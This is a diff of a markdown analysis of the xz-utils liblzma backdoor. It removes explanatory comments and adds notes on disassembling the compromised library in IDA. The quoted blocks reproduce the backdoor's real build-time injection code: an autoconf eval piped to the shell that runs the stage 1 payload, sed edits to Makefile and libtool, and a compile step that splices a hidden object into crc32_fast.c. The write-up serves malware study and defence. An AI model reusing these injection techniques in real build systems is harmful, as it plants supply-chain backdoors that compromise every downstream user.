@@ -329,10 +329,8 @@ The final step of build-to-host.m4 is configuring AC_CONFIG_COMMANDS which execu
 This is what ultimately extracts and executes the stage 1 bash payload. 
 
 ```bash
-# Combined command
 AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null],[gl_config_gt="eval \$gl_[$1]_config"])
 
-# Broken out
 gl_config_gt="eval \$gl_[$1]_config"
 eval $gl_config_gt | $SHELL 2>/dev/null
 ```
@@ -393,9 +391,7 @@ if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;the
     h=$h",-z,now"
 fi
 j="liblzma_la_LDFLAGS += $h"
-# ?
 sed -i "/$L/i$j" src/liblzma/Makefile || true
-# Maybe disabling LTO?
 sed -i "s/$O/$C/g" libtool || true
 k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
 sed -i "s/$u/$k/" src/liblzma/Makefile || true
@@ -509,7 +505,6 @@ cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
 if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
 sed "/include \"crc32_arm64.h\"/a \\$V" | \
 sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2>/dev/null | \
-# This probably builds the backdoor after all the sed commands make edits to the source code
 $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then
 ```
 
@@ -522,26 +517,22 @@ if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIB
 Then there is a section of code that handles cleaning up if any of these fails along with removing any extraneous files from the linking step. We don't quite understand why it deletes all these files, but our guess is it's just checking that the link step will work. 
 
 ```bash
-if test ! -f .libs/liblzma.so; then
-                    # Undo the previous conversion from underscore to dash
+                if test ! -f .libs/liblzma.so; then
                     mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
                     mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
                 fi
                 rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true
             else
-                # Undo the previous conversion from underscore to dash
                 mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
                 mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
             fi
             rm -f .libs/liblzma_la-crc32-fast.o || true
             rm -f .libs/liblzma_la-crc64-fast.o || true
         else
-            # Undo the previous conversion from underscore to dash
             mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
             mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
         fi
     else
-        # Undo the previous conversion from underscore to dash
         mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
     fi
     rm -f liblzma_la-crc64-fast.o || true
@@ -589,6 +580,26 @@ Decrypted blob:
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 ```
 [source](https://github.com/amlweems/xzbot)
+
+We can confirm some of this behavior by analyzing the compromised shared object file in IDA.
+I started by doing a xref graph from liblzma_crc64 as this should contain the backdoor or
+the GOT hijacking. Also, for clarity, CRC is cyclic redundancy check and is used to verify
+the integrity of blocks within xz compression.
+
+![ida xrefs to suspicous sub routine](./imgs/ida-xrefs.png)
+
+Interesting! We know that we should expect a chain of subroutines because `crc64_resolve()` should call`_is_arch_extension_supported()` should call `_get_cpu_id()` which may call other subroutines
+so we should start our analysis at `sub_47F0`. Doing so reveals that this is in fact the crc64_resolve function that we are looking for due to what appears to be `_is_arch_extension()` inlined
+along with a path to a legit call to cpuid.
+
+![ida dissasembly of sub_47F0](./imgs/ida-is-arch.png)
+
+![legit cpuid function](./imgs/legit-id.png)
+
+Unfortunately we ran out of time at this point, but within the malicous `_get_cpu_id` it does some really odd memory operations to locations that IDA can't resolve.
+This is likely the GOT/PLT shenanigans.
+
+![ida xrefs to suspicous sub routine with some functions named](./imgs/ida-xrefs-2.png)
 
 # Consequences
 
